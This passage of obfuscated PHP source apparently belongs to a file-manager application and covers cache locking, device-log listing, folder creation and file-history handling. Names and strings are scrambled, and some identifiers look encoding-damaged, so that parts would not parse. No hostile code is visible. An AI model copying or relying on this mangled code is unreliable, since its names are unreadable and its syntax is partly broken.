$…¡ÙÏ·[$¸­®‡ÕŞ] : $Ó™ÛáÏÀ; $ÛÉı¨óŒ[$Éæ¯Êø•[2078]] = $ÕÒ¼˜»ï; $†ìƒâÕÏ = json_decode($ÛÉı¨óŒ[$Éæ¯Êø•[504]], !0); $ÛÉı¨óŒ[$Éæ¯Êø•[2332]] = isset($†ìƒâÕÏ[$Éæ¯Êø•[2332]]) ? $†ìƒâÕÏ[$Éæ¯Êø•[2332]] : $Éæ¯Êø•[12]; $ÛÉı¨óŒ[$Éæ¯Êø•[2336]] = IpLocation::get($ÛÉı¨óŒ[$Éæ¯Êø•[2332]]); if (strpos($¸­®‡ÕŞ, $Éæ¯Êø•[2138]) === 0 || isset($†ìƒâÕÏ[$Éæ¯Êø•[2136]])) { $†ìƒâÕÏ[$Éæ¯Êø•[89]] = $ã™ôëÖ”[$†ìƒâÕÏ[$Éæ¯Êø•[183]]]; $†ìƒâÕÏ[$Éæ¯Êø•[2151]] = $ã™ôëÖ”[$†ìƒâÕÏ[$Éæ¯Êø•[2136]]]; if ($†ìƒâÕÏ[$Éæ¯Êø•[33]] == $Éæ¯Êø•[598]) { $†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[1216]] = $ã™ôëÖ”[$†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[1216]]]; $†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[1217]] = $ã™ôëÖ”[$†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[1217]]]; } if ($†ìƒâÕÏ[$Éæ¯Êø•[33]] == $Éæ¯Êø•[2146]) { $†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[183]] = $ã™ôëÖ”[$†ìƒâÕÏ[$Éæ¯Êø•[504]][$Éæ¯Êø•[183]]]; } if ($†ìƒâÕÏ[$Éæ¯Êø•[33]] == $Éæ¯Êø•[1875]) { $†ìƒâÕÏ[$Éæ¯Êø•[2151]] = $†ìƒâÕÏ[$Éæ¯Êø•[89]]; $†ìƒâÕÏ[$Éæ¯Êø•[2136]] = $†ìƒâÕÏ[$Éæ¯Êø•[2151]][$Éæ¯Êø•[183]]; $†ìƒâÕÏ[$Éæ¯Êø•[89]] = !1; $†ìƒâÕÏ[$Éæ¯Êø•[183]] = $Éæ¯Êø•[12]; } if ($†ìƒâÕÏ[$Éæ¯Êø•[89]] && $†ìƒâÕÏ[$Éæ¯Êø•[89]][$Éæ¯Êø•[180]] == $Éæ¯Êø•[181]) { $¼üõ•½¹[] = $ÛÉı¨óŒ[$Éæ¯Êø•[453]]; unset($ ÓÆ¿•[$À»ß²¿œ]); continue; } if ($†ìƒâÕÏ[$Éæ¯Êø•[2151]] && $†ìƒâÕÏ[$Éæ¯Êø•[2151]][$Éæ¯Êø•[180]] == $Éæ¯Êø•[181]) { $¼üõ•½¹[] = $ÛÉı¨óŒ[$Éæ¯Êø•[453]]; unset($ ÓÆ¿•[$À»ß²¿œ]); continue; } } $ÛÉı¨óŒ[$Éæ¯Êø•[504]] = $†ìƒâÕÏ; unset($ÛÉı¨óŒ[$Éæ¯Êø•[2341]]); $’ŸšË[] = $ÛÉı¨óŒ; } $this->clearSystemPathLog($¼üõ•½¹); return $’ŸšË; } private function clearSystemPathLog($±ôä“É„) { $Öôå¸Ü´ =& $_SERVER[ú‡®¯¨±]; if (count($±ôä“É„) == 0) { return; } $¨£ÎµÀ = array($Öôå¸Ü´[453] => array($Öôå¸Ü´[7], array_unique($±ôä“É„))); $this->where($¨£ÎµÀ)->delete(); } public function deviceList($­ÄıØı, $Öö¬¾ûı = 0) { $Ïíö˜±ù =& $_SERVER[ú‡®¯¨±]; $¿µÉÁ° = array($Ïíö˜±ù[1708] => $­ÄıØı, $Ïíö˜±ù[227] => array($Ïíö˜±ù[1070], $Öö¬¾ûı), $Ïíö˜±ù[33] => $Ïíö˜±ù[1849]); $º‚ËòŸ— = array(); $íÙë´™î = $this->field($Ïíö˜±ù[2342])->where($¿µÉÁ°)->order($Ïíö˜±ù[2149])->limit(50)->select(); foreach ($íÙë´™î as $ŸÎ´íÍ => $ñÀ¢¬ëõ) { if ($ŸÎ´íÍ > 0 && abs($ñÀ¢¬ëõ[$Ïíö˜±ù[227]] - $íÙë´™î[$ŸÎ´íÍ - 1][$Ïíö˜±ù[227]]) < 5) { continue; } $°ÈòÌõ = json_decode($ñÀ¢¬ëõ[$Ïíö˜±ù[504]], !0); $ñÀ¢¬ëõ[$Ïíö˜±ù[2332]] = isset($°ÈòÌõ[$Ïíö˜±ù[2332]]) ? $°ÈòÌõ[$Ïíö˜±ù[2332]] : $Ïíö˜±ù[12]; unset($°ÈòÌõ[$Ïíö˜±ù[2332]]); $åı¸™êÒ = $this->deviceType($°ÈòÌõ[$Ïíö˜±ù[2139]]); if (isset($º‚ËòŸ—[$åı¸™êÒ])) { continue; } $ñÀ¢¬ëõ[$Ïíö˜±ù[2336]] = IpLocation::get($ñÀ¢¬ëõ[$Ïíö˜±ù[2332]]); $ñÀ¢¬ëõ[$Ïíö˜±ù[504]] = $°ÈòÌõ; $º‚ËòŸ—[$åı¸™êÒ] = $ñÀ¢¬ëõ; } return array_values($º‚ËòŸ—); } public function deviceType($©’•¼„­) { return $©’•¼„­; } } goto eîî°ƒßßÀ; AÅÊÙëäïì: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $úËÛØÄ =& $_SERVER[ú‡®¯¨±]; if (self::$handle) { return self::$handle; } $˜¤ú™²Ä = $GLOBALS[$úËÛØÄ[6]][$úËÛØÄ[404]]; self::$timeout = $˜¤ú™²Ä[$úËÛØÄ[896]] ? $˜¤ú™²Ä[$úËÛØÄ[896]] : 10; $È®¸¬ø§ = _get($GLOBALS[$úËÛØÄ[6]], $úËÛØÄ[897]); $ß®îŒ–İ = $˜¤ú™²Ä[$úËÛØÄ[882]] ? $˜¤ú™²Ä[$úËÛØÄ[882]] : $úËÛØÄ[226]; if ($ß®îŒ–İ == $úËÛØÄ[21] && $È®¸¬ø§ == $úËÛØÄ[13]) { $ß®îŒ–İ = $úËÛØÄ[226]; } switch ($ß®îŒ–İ) { case $úËÛØÄ[885]: self::$handle = new CacheLockRedis(); break; case $úËÛØÄ[886]: self::$handle = new CacheLockMemcached(); break; case $úËÛØÄ[21]: self::$handle = new CacheLockDatabase(); break; case $úËÛØÄ[226]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($úËÛØÄ[898], $úËÛØÄ[899]); } return self::$handle; } private static function key($ÑÛ¦‚Ô) { return $_SERVER[ú‡®¯¨±][900] . Cache::key($ÑÛ¦‚Ô); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($¢Ô‡… = '') { self::$errorMsg = $¢Ô‡…; } public static function lockGlobal($ßğ·‚ìØ, $é÷©¡’Ó) { return self::lock($ßğ·‚ìØ, $é÷©¡’Ó, !0); } public static function lock($¢¿¼·Õ, $œìÛœş¦ = false, $·®Ë‹ôß = false) { $Ü‰ˆ»‚î =& $_SERVER[ú‡®¯¨±]; $ÜÛ‘‹ë = self::init(); $°Ø±Éíû = self::key($¢¿¼·Õ); $œìÛœş¦ = $œìÛœş¦ ? $œìÛœş¦ : self::$timeout; $üã‘ƒÌ” = timeFloat(); $‘°çÅ¬Ó = $ÜÛ‘‹ë->lock($°Ø±Éíû, $œìÛœş¦); $¾ä†ÈÉå = timeFloat(); if (!$‘°çÅ¬Ó) { $¯¾’ôÉ¼ = "\x6c\157\x63\x6b\40\145\162\162\157\162\73\x6b\145\171\x3d{$¢¿¼·Õ}\x3b\x74\x69\x6d\145\75{$œìÛœş¦}\x3b" . self::$errorMsg . $Ü‰ˆ»‚î[73] . get_caller_msg(); $ª»´á = LNG($Ü‰ˆ»‚î[901]) . "\50{$œìÛœş¦}\163\51\56" . LNG($Ü‰ˆ»‚î[902]); $ª»´á .= $Ü‰ˆ»‚î[903]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ª»´á = $ª»´á . $Ü‰ˆ»‚î[904] . self::$errorMsg; } write_log($Ü‰ˆ»‚î[905] . sprintf($Ü‰ˆ»‚î[906], timeFloat() - $üã‘ƒÌ”) . $Ü‰ˆ»‚î[907] . $¯¾’ôÉ¼ . $Ü‰ˆ»‚î[908] . error_get_last(), $Ü‰ˆ»‚î[899]); show_json($ª»´á, !1); } if (!$·®Ë‹ôß) { self::$lockItem[$°Ø±Éíû] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $˜ÁšŠ³º = number_format(timeFloat() - $¾ä†ÈÉå, 3); write_log($Ü‰ˆ»‚î[909] . $¢¿¼·Õ . $Ü‰ˆ»‚î[910] . $˜ÁšŠ³º, $Ü‰ˆ»‚î[899]); } return $‘°çÅ¬Ó; } public static function lockGet($¡¤‹èíí) { $Ó¼¨ÒÅ¨ = self::key($¡¤‹èíí); if (self::$lockItem[$Ó¼¨ÒÅ¨]) { return self::$lockItem[$Ó¼¨ÒÅ¨]; } return self::init()->lockGet($Ó¼¨ÒÅ¨); } public static function unlock($Èåè¬ç) { $Û”±Óê =& $_SERVER[ú‡®¯¨±]; $ÄÉ¾ø¾ = self::key($Èåè¬ç); self::$lockItem[$ÄÉ¾ø¾] = null; self::init()->unlock($ÄÉ¾ø¾); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Û”±Óê[911] . $Èåè¬ç, $Û”±Óê[899]); } return; } public static function unlockRuntime() { $Ï Â‡²© =& $_SERVER[ú‡®¯¨±]; $–ÔŒµ×‚ = self::init(); $Ñİ÷ñ† = !1; foreach (self::$lockItem as $«ö½ùÕî => $À¬Û¡ìÒ) { if (!$À¬Û¡ìÒ) { continue; } $–ÔŒµ×‚->unlock($«ö½ùÕî); if (!$Ñİ÷ñ†) { $Ñİ÷ñ† = !0; write_log($Ï Â‡²©[912] . $«ö½ùÕî . $Ï Â‡²©[73] . get_caller_msg(), $Ï Â‡²©[899]); continue; } write_log($Ï Â‡²©[912] . $«ö½ùÕî, $Ï Â‡²©[899]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $“©íÜ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Ï Â‡²©[913] . $“©íÜ . $Ï Â‡²©[914] . ACTION, $Ï Â‡²©[899]); } } public static function fileLock($¹­™ù“ô) { $ÆçÖ¤™ =& $_SERVER[ú‡®¯¨±]; if (!$GLOBALS[$ÆçÖ¤™[915]]) { $GLOBALS[$ÆçÖ¤™[915]] = array(); } $GLOBALS[$ÆçÖ¤™[915]][$¹­™ù“ô] = !1; $Ú»‚¥¢ = fopen(DATA_PATH . $¹­™ù“ô . $ÆçÖ¤™[916], $ÆçÖ¤™[917]); if (!$Ú»‚¥¢) { return !1; } $GLOBALS[$ÆçÖ¤™[915]][$¹­™ù“ô] = $Ú»‚¥¢; if (flock($Ú»‚¥¢, LOCK_EX)) { return !0; } self::unlock($¹­™ù“ô); show_json($ÆçÖ¤™[918], !1); return !1; } public static function fileUnlock($ïÉïÖœ) { $¬à‘ñØÀ =& $_SERVER[ú‡®¯¨±]; $”Çê™ä = $GLOBALS[$¬à‘ñØÀ[915]][$ïÉïÖœ]; if (!$”Çê™ä) { return; } $GLOBALS[$¬à‘ñØÀ[915]][$ïÉïÖœ] = !1; flock($”Çê™ä, LOCK_UN); fclose($”Çê™ä); } public static function fileUnlockAll() { $õ€Ûà¶ =& $_SERVER[ú‡®¯¨±]; if (!$GLOBALS[$õ€Ûà¶[915]]) { return; } foreach ($GLOBALS[$õ€Ûà¶[915]] as $ôƒ‹˜ôé => $º¯È™) { if (!$º¯È™) { continue; } $GLOBALS[$õ€Ûà¶[915]][$ôƒ‹˜ôé] = !1; flock($º¯È™, LOCK_UN); fclose($º¯È™); } $GLOBALS[$õ€Ûà¶[915]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ŸòÙûÅ =& $_SERVER[ú‡®¯¨±]; $î«¢ùŠ = $GLOBALS[$ŸòÙûÅ[6]][$ŸòÙûÅ[404]]; self::$cachePath = $î«¢ùŠ[$ŸòÙûÅ[226]][$ŸòÙûÅ[86]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($”Î°Óõ, $˜üƒÍë× = 0) { $ú¬¼¬òÉ =& $_SERVER[ú‡®¯¨±]; $ßèòãº– = microtime(!0); $¤Ì˜‚‘¿ = $ßèòãº– + $˜üƒÍë× + 0.0001; $Éşã³Ä¥ = rtrim(self::$cachePath, $ú¬¼¬òÉ[8]) . $ú¬¼¬òÉ[919] . md5($”Î°Óõ) . $ú¬¼¬òÉ[916]; if (file_exists($Éşã³Ä¥) && filemtime($Éşã³Ä¥) && filemtime($Éşã³Ä¥) < time() - 10) { @unlink($Éşã³Ä¥); } do { if (file_exists($Éşã³Ä¥)) { cacheLockWait(); continue; } $¹ñıú–Ã = fopen($Éşã³Ä¥, $ú¬¼¬òÉ[920]); if (!$¹ñıú–Ã) { return !1; } $„¥Æƒú = flock($¹ñıú–Ã, LOCK_EX | LOCK_NB); self::$caches[$”Î°Óõ] = array($ú¬¼¬òÉ[921] => $¹ñıú–Ã, $ú¬¼¬òÉ[226] => $Éşã³Ä¥); fwrite($¹ñıú–Ã, $¤Ì˜‚‘¿); clearstatcache(); if ($¹ñıú–Ã && $„¥Æƒú) { return !0; } cacheLockWait(); } while (microtime(!0) < $¤Ì˜‚‘¿); $this->unlock($”Î°Óõ); return !1; } public function lockGet($…Œè¯ØÃ) { $õ˜áêÂ =& $_SERVER[ú‡®¯¨±]; $Ó¨à÷şê = rtrim(self::$cachePath, $õ˜áêÂ[8]) . $õ˜áêÂ[919] . md5($…Œè¯ØÃ) . $õ˜áêÂ[916]; return file_exists($Ó¨à÷şê); } public function unlock($É•Æ‘êÖ) { $€”¡¨¢ì =& $_SERVER[ú‡®¯¨±]; $ù¶Œãš = self::$caches[$É•Æ‘êÖ]; if (!$ù¶Œãš) { return; } @flock($ù¶Œãš[$€”¡¨¢ì[921]], LOCK_UN); @fclose($ù¶Œãš[$€”¡¨¢ì[921]]); @unlink($ù¶Œãš[$€”¡¨¢ì[226]]); unset(self::$caches[$É•Æ‘êÖ]); } } goto CìóëŠ§‰; FÈ¶îœŠÉî: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÓÚåŠÅ¹) { $Ã•éªÁµ =& $_SERVER[ú‡®¯¨±]; $Ã©“”’› = Model($Ã•éªÁµ[556])->where(array($Ã•éªÁµ[1699] => $ÓÚåŠÅ¹))->find(); $¤˜ŒÊ„í = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÓÚåŠÅ¹, $Ã©“”’›[$Ã•éªÁµ[32]]); $this->userDesktopAdd($¤˜ŒÊ„í); return $¤˜ŒÊ„í; } public function userDesktopAdd($±¨¬«¤€) { $œ¤¶ñ× =& $_SERVER[ú‡®¯¨±]; $Â÷Ù­‰¦ = LNG($œ¤¶ñ×[2181]); $ÌÃÒ„Á— = $this->mkdir($±¨¬«¤€, $Â÷Ù­‰¦); $this->metaSet($ÌÃÒ„Á—, $œ¤¶ñ×[2182], $œ¤¶ñ×[90]); $this->metaSet($±¨¬«¤€, $œ¤¶ñ×[2183], $ÌÃÒ„Á—); } public function userPathSafeAdd($€¼Ô«ÅÃ) { $íÈ‚­–® =& $_SERVER[ú‡®¯¨±]; $æÛë©–á = Model($íÈ‚­–®[556])->getInfoFull($€¼Ô«ÅÃ); if (!$æÛë©–á) { return !1; } if (_get($æÛë©–á, $íÈ‚­–®[578])) { return $æÛë©–á[$íÈ‚­–®[517]][$íÈ‚­–®[2184]]; } $ ö˜µì = $this->_mkdirRoot(SourceModel::TYPE_USER, $€¼Ô«ÅÃ, $íÈ‚­–®[2185], $íÈ‚­–®[484]); Model($íÈ‚­–®[556])->metaSet($€¼Ô«ÅÃ, $íÈ‚­–®[2184], $ ö˜µì); $this->metaSet($ ö˜µì, $íÈ‚­–®[2186], $€¼Ô«ÅÃ); return $ ö˜µì; } public function groupRootAdd($¨üåÓû) { $·ç€Ëë  =& $_SERVER[ú‡®¯¨±]; $œş½ˆâï = Model($·ç€Ëë [564])->where(array($·ç€Ëë [1994] => $¨üåÓû))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¨üåÓû, $œş½ˆâï[$·ç€Ëë [32]]); } public function systemRootPathAdd($—°ĞíŸ) { if ($—°ĞíŸ != $_SERVER[ú‡®¯¨±][584]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $—°ĞíŸ); } public function userRootRemove($µÈ¡°) { $‚Òó˜ğÈ = $this->targetSourceRoot(SourceModel::TYPE_USER, $µÈ¡°, !0); foreach ($‚Òó˜ğÈ as $ÛàÊ¾¯Ï) { if (!$ÛàÊ¾¯Ï) { continue; } $this->remove($ÛàÊ¾¯Ï[$_SERVER[ú‡®¯¨±][183]], !1); } } public function groupRootRemove($‡®¦ªÎş) { $ãûÑ¦ıƒ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $‡®¦ªÎş); if (!$ãûÑ¦ıƒ) { return; } $this->remove($ãûÑ¦ıƒ[$_SERVER[ú‡®¯¨±][183]], !1); } private function _mkdirRoot($ºÂ»Ë”ö, $§Òñ, $İ·‰’¥–, $è©«ÈÂ’ = '') { $úÄ™Ç¾ =& $_SERVER[ú‡®¯¨±]; $€ıëŠ°¨ = defined($úÄ™Ç¾[2129]) ? USER_ID : 0; $Î«»Å = array($úÄ™Ç¾[455] => 0, $úÄ™Ç¾[626] => $ºÂ»Ë”ö, $úÄ™Ç¾[627] => $§Òñ, $úÄ™Ç¾[624] => 1, $úÄ™Ç¾[628] => $€ıëŠ°¨, $úÄ™Ç¾[629] => $€ıëŠ°¨, $úÄ™Ç¾[625] => $è©«ÈÂ’, $úÄ™Ç¾[630] => $úÄ™Ç¾[573], $úÄ™Ç¾[482] => 0, $úÄ™Ç¾[595] => 0, $úÄ™Ç¾[520] => 0, $úÄ™Ç¾[631] => $úÄ™Ç¾[12]); if ($ë¬’¼º = $this->where($Î«»Å)->find()) { return $ë¬’¼º[$úÄ™Ç¾[183]]; } $°ö‰‰ıÀ = "\115\157\144\x65\x6c\123\157\165\162\x63\145\x2e\x6d\153\144\x69\162\122\157\x6f\164\x2e{$ºÂ»Ë”ö}\56{$§Òñ}\x2e" . $İ·‰’¥–; CacheLock::lock($°ö‰‰ıÀ); $Î«»Å[$úÄ™Ç¾[32]] = $İ·‰’¥–; $Á‰ß´‘¨ = $this->add($Î«»Å); $Û‘ËËÆ = array($úÄ™Ç¾[632] => short_id($Á‰ß´‘¨)); $this->where(array($úÄ™Ç¾[469] => $Á‰ß´‘¨))->save($Û‘ËËÆ); CacheLock::unlock($°ö‰‰ıÀ); return $Á‰ß´‘¨; } private function targetSourceRoot($Ò”¬¶´Ş, $Ã‘À‰—Û, $î ™Û¬ = false) { $ã¿‰¶Ìâ =& $_SERVER[ú‡®¯¨±]; $™È”†ğ = array($ã¿‰¶Ìâ[455] => 0, $ã¿‰¶Ìâ[626] => $Ò”¬¶´Ş, $ã¿‰¶Ìâ[627] => $Ã‘À‰—Û); if ($î ™Û¬) { $ÕÕ×„é = $this->where($™È”†ğ)->select(); return $ÕÕ×„é ? $ÕÕ×„é : array(); } $çˆÎ§¿ƒ = $this->where($™È”†ğ)->find(); return $çˆÎ§¿ƒ ? $çˆÎ§¿ƒ : array(); } public function sourceRootGroup($ÕˆÔ‚ø˜) { $õ‘¸‚Ñï =& $_SERVER[ú‡®¯¨±]; if (is_string($ÕˆÔ‚ø˜)) { $ÕˆÔ‚ø˜ = array($ÕˆÔ‚ø˜); } $âà´è†É = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÕˆÔ‚ø˜, $õ‘¸‚Ñï[215]); $ÚÌË¬¢Ü = array($õ‘¸‚Ñï[424] => $âà´è†É, $õ‘¸‚Ñï[421] => array($õ‘¸‚Ñï[813] => count($ÕˆÔ‚ø˜))); $this->_listDataApply($ÚÌË¬¢Ü[$õ‘¸‚Ñï[424]]); $this->_listMake($ÚÌË¬¢Ü); return array_to_keyvalue($ÚÌË¬¢Ü[$õ‘¸‚Ñï[84]], $õ‘¸‚Ñï[548]); } public function mkfile($»ÍñîœÁ, $ ¿¸¸ª, $Ò»Üªã = '', $†ÜäÌù = REPEAT_RENAME) { $¼ÑÎ¨¶ì =& $_SERVER[ú‡®¯¨±]; $¹ì©æÄú = Model($¼ÑÎ¨¶ì[652])->addFileByContent($Ò»Üªã, $ ¿¸¸ª); return $this->_createFileCall($»ÍñîœÁ, $ ¿¸¸ª, $¹ì©æÄú, $†ÜäÌù, $¼ÑÎ¨¶ì[1399]); } public function addFile($ò‘¼‹ÊÙ, $‹ëš¡ã, $éáºğê, $÷ÆŒÃæÒ = false, $£Íäìö = REPEAT_RENAME) { $Æ‡œŒµ = Model($_SERVER[ú‡®¯¨±][652])->addFile($‹ëš¡ã, $éáºğê, $÷ÆŒÃæÒ); return $this->_createFileCall($ò‘¼‹ÊÙ, $éáºğê, $Æ‡œŒµ, $£Íäìö); } public function addFileByFileID($ü¥Â¤†, $æá¥”»à, $œÂôôÂ, $‡°í‚»Å = REPEAT_RENAME) { $¤«…¨ª¹ =& $_SERVER[ú‡®¯¨±]; $ñú¤Ä°• = Model($¤«…¨ª¹[652])->find($æá¥”»à); Model($¤«…¨ª¹[652])->linkAdd($æá¥”»à); return $this->_createFileCall($ü¥Â¤†, $œÂôôÂ, $ñú¤Ä°•, $‡°í‚»Å); } public function addFileByRemote($æÆìªèˆ, $êî¦²—, $ÎÇáØ¬Ö, $¦œ¨ØºÉ = array(), $ÆË¸‚òæ = REPEAT_RENAME) { $ñ±ïÍİ = Model($_SERVER[ú‡®¯¨±][652])->addFileByRemote($êî¦²—, $ÎÇáØ¬Ö, $¦œ¨ØºÉ); return $this->_createFileCall($æÆìªèˆ, $ÎÇáØ¬Ö, $ñ±ïÍİ, $ÆË¸‚òæ); } private function _createFileCall($Ù™êÊÚœ, $äÛôûûÃ, $ÄãíŸĞ¬, $‘ÁçÜÛ¹, $¬­°¯¸¹ = "\165\160\154\157\x61\144") { $µ­ŠÎ‚Ó =& $_SERVER[ú‡®¯¨±]; $Ô•§¹üÂ = !1; $this->setMasterDB(); $this->lockWriteStart($Ù™êÊÚœ, $äÛôûûÃ); $üÜî¤óÎ = $this->fileNameExist($Ù™êÊÚœ, $äÛôûûÃ); $®ì„¼—½ = $this->_createFile($Ù™êÊÚœ, $äÛôûûÃ, $ÄãíŸĞ¬, $‘ÁçÜÛ¹, $Ô•§¹üÂ); if (!$Ô•§¹üÂ) { Model($µ­ŠÎ‚Ó[522])->remove($ÄãíŸĞ¬[$µ­ŠÎ‚Ó[519]]); } if ($Ô•§¹üÂ && $®ì„¼—½ && $®ì„¼—½ != $üÜî¤óÎ) { Model($µ­ŠÎ‚Ó[2154])->eventCreate($®ì„¼—½, $¬­°¯¸¹); } $this->lockWriteEnd($Ù™êÊÚœ, $äÛôûûÃ); return $®ì„¼—½; } public function mkdir($äÑ”õ—å, $“ËÍ·±Ù, $…’åß¥² = REPEAT_SKIP) { $åó¥™à =& $_SERVER[ú‡®¯¨±]; $this->setMasterDB(); $ü·÷ß«µ = $this->sourceInfo($äÑ”õ—å); if (!$ü·÷ß«µ) { return !1; } $this->lockWriteStart($äÑ”õ—å, $“ËÍ·±Ù); if ($…’åß¥² !== !1) { $ÍÃÜàÊ = $this->fileNameExist($äÑ”õ—å, $“ËÍ·±Ù); if ($ÍÃÜàÊ && $…’åß¥² != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($äÑ”õ—å, $“ËÍ·±Ù); return $ÍÃÜàÊ; } $“ËÍ·±Ù = $this->fileNameAuto($äÑ”õ—å, $“ËÍ·±Ù, $…’åß¥²); } $È¯ŸÂ = array($åó¥™à[624] => 1, $åó¥™à[472] => $“ËÍ·±Ù, $åó¥™à[625] => $åó¥™à[12], $åó¥™à[520] => 0, $åó¥™à[595] => 0); $ ãÔªÂä = $this->_addSource($È¯ŸÂ, $ü·÷ß«µ); Model($åó¥™à[2154])->eventCreate($ ãÔªÂä, $åó¥™à[1400]); $this->lockWriteEnd($äÑ”õ—å, $“ËÍ·±Ù); return $ ãÔªÂä; } public function listSourceRoot($Ã¤œÅÛì, $³£œ•Í, $Ô÷®âÔë = "\x73\157\165\x72\143\145\111\104\x2c\x74\x61\162\147\x65\164\111\104\x2c\163\x69\172\145") { $ú–Óñ =& $_SERVER[ú‡®¯¨±]; $üÊ¾„×æ = $ú–Óñ[211]; $±ãÔË‚Œ = array(); $¡üø‰’ = 1024 * 50; $ëãöüŞ® = is_array($ëãöüŞ®) ? $ëãöüŞ® : array(); $ä³ÉµŒİ = count($³£œ•Í); $ŠËß²Ë = $this->tablePrefix . $ú–Óñ[2187]; for ($úÕ¨š³Ò = 0; $úÕ¨š³Ò < $ä³ÉµŒİ; $úÕ¨š³Ò++) { $ñ¹‘ÕËÀ = $³£œ•Í[$úÕ¨š³Ò]; $üÊ¾„×æ .= "\x53\x45\x4c\105\103\124\40\52\x20\x46\122\117\x4d\x20\50\123\105\x4c\x45\x43\x54\x20{$Ô÷®âÔë}\40\106\x52\117\115\40\x60{$ŠËß²Ë}\x60\40\x57\x48\105\122\105\x20"; $üÊ¾„×æ .= "\x60\160\x61\x72\145\156\164\111\104\x60\x3d\60\40\101\x4e\104\40\x60\x74\x61\162\147\x65\164\x49\x44\x60\x3d{$ñ¹‘ÕËÀ}\40\101\x4e\x44\x20\140\x74\x61\x72\147\x65\164\x54\x79\160\x65\x60\x3d{$Ã¤œÅÛì}\x20\x61\x6e\144\x20\x66\151\154\145\124\171\160\x65\75\x27\x27\40\x6c\x69\155\x69\164\x20\x31\x29\40\x61\x73\x20\164\142\137{$úÕ¨š³Ò}\x20\125\x4e\x49\117\116\40\x41\114\x4c\x20"; if ((strlen($üÊ¾„×æ) >= $¡üø‰’ || $úÕ¨š³Ò == $ä³ÉµŒİ - 1) && $üÊ¾„×æ) { $üÊ¾„×æ = substr($üÊ¾„×æ, 0, -strlen($ú–Óñ[1094])); $Ëš•¢éŞ = $this->query($üÊ¾„×æ); $üÊ¾„×æ = $ú–Óñ[12]; $±ãÔË‚Œ = array_merge($±ãÔË‚Œ, $Ëš•¢éŞ); } } return $±ãÔË‚Œ; } private function _createFile($¬öŸ·å, $¸Öæ«×°, $Ã›ÂÛËÑ, $›°ÖÙ™, &$ßÓíİ’Â) { $ÔÙ¶ãôÀ =& $_SERVER[ú‡®¯¨±]; $¶˜‡Š²Ò = $this->sourceInfo($¬öŸ·å); if (!$Ã›ÂÛËÑ || !$¶˜‡Š²Ò) { return !1; } if ($›°ÖÙ™ !== !1) { $ÙİÅñæ  = $this->fileNameExist($¬öŸ·å, $¸Öæ«×°); } $ßÓíİ’Â = !0; if ($›°ÖÙ™ && $ÙİÅñæ ) { if ($›°ÖÙ™ == REPEAT_SKIP) { $ßÓíİ’Â = !1; return $ÙİÅñæ ; } else { if ($›°ÖÙ™ == REPEAT_REPLACE) { $¯ØŞ­¦¶ = $this->sourceInfo($ÙİÅñæ ); $ •ÔˆÊ = $this->fileHistory($¯ØŞ­¦¶, $Ã›ÂÛËÑ[$ÔÙ¶ãôÀ[519]], $Ã›ÂÛËÑ[$ÔÙ¶ãôÀ[78]]); if (!$ •ÔˆÊ) { $ßÓíİ’Â = !1; } else { $this->folderSizeReset($¬öŸ·å); } return $ÙİÅñæ ; } else { $¸Öæ«×° = $this->fileNameAuto($¬öŸ·å, $¸Öæ«×°, $›°ÖÙ™, !1); } } } $ßòÍ¯ßÆ = array($ÔÙ¶ãôÀ[624] => 0, $ÔÙ¶ãôÀ[472] => $¸Öæ«×°, $ÔÙ¶ãôÀ[625] => substr(get_path_ext($¸Öæ«×°), 0, 10), $ÔÙ¶ãôÀ[520] => $Ã›ÂÛËÑ[$ÔÙ¶ãôÀ[519]], $ÔÙ¶ãôÀ[595] => $Ã›ÂÛËÑ[$ÔÙ¶ãôÀ[78]]); $Ä¡¹Ûóí = $this->_addSource($ßòÍ¯ßÆ, $¶˜‡Š²Ò); $this->folderSizeReset($¬öŸ·å, intval($ßòÍ¯ßÆ[$ÔÙ¶ãôÀ[78]])); return $Ä¡¹Ûóí; } protected function fileHistory($€Ã•ô¦Í, $ÑÌ§õï¬, $¬Ú¨£–) { $Í²ÇÍŞ¯ =& $_SERVER[ú‡®¯¨±]; if ($€Ã•ô¦Í[$Í²ÇÍŞ¯[519]] == $ÑÌ§õï¬) { return !1; } $this->checkLock($€Ã•ô¦Í[$Í²ÇÍŞ¯[183]], $ÑÌ§õï¬); Model($Í²ÇÍŞ¯[2188])->addHistory($€Ã•ô¦Í); $áğˆº‘ê = array($Í²ÇÍŞ¯[629] => USER_ID, $Í²ÇÍŞ¯[476] => time(), $Í²ÇÍŞ¯[519] => $ÑÌ§õï¬, $Í²ÇÍŞ¯[78] => $¬Ú¨£–); $this->where(array($Í²ÇÍŞ¯[469] => $€Ã•ô¦Í[$Í²ÇÍŞ¯[183]]))->save($áğˆº‘ê); $this->sourceCacheClear($€Ã•ô¦Í[$Í²ÇÍŞ¯[183]]); return !0; } public function checkLock($ï«·›»¿, $ÁÊÆÄ•„) { $¯©ŒüÂ¥ =& $_SERVER[ú‡®¯¨±]; $ö¸©€èŸ = $this->pathInfo($ï«·›»¿); if (!$this->fileIsLock($ö¸©€èŸ, !0)) { return; } $Ï®ã¨±¤ = Session::get($¯©ŒüÂ¥[2189]); $Ñ¿Ì—ìè = 